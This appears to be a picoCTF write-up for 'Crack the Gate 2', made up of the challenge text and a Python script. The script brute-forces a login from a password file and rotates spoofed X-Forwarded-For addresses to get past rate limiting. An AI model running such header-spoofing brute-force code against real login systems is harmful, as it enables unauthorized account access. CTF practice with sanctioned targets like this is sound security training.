# Crack the Gate 2
The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source.
We’ve received a tip that the system might still trust user-controlled headers.
Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.

---

```
import requests

email = "ctf-player@picoctf.org"
password = []
url = "http://amiable-citadel.picoctf.net:56817/login" #Change this
ip = []
j = 0

with open('passwords.txt','r') as file:
	for line in file:
		password.append(line.strip())
for i in range(255):
	ip.append("192.168.1."+str(i))
			

for i in password:
	header = {"X-Forwarded-For":ip[j]}
	r = requests.post(url,data={"email":email,"password":i},allow_redirects=False,headers=header)
	if r.status_code == 429:
		j+=1
	print("Content:",r.content)
	print("Code:",r.status_code)



```
